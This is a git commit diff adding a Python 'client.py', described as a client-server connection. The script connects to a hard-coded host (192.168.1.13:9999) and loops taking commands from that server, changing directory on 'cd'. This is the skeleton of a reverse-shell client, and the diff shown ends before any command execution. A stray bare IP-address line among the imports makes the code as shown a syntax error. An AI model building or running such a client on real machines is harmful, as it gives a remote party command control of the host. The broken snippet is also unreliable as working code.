f6a84010087bb9c1d0d304e77e3bddd120594961
Neha Chauhan <64642273+nehachauhan22@users.noreply.github.com>
2020-08-08 16:03:31 +0530

    Update client.py
    Client Server Connection

--- client.py
+++ client.py
@@ -1,1 +1,15 @@
+import socket
+import os
+import subprocess
+192.168.18.5
 
+s = socket.socket()
+host = '192.168.1.13'
+port = 9999
+
+s.connect((host,port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
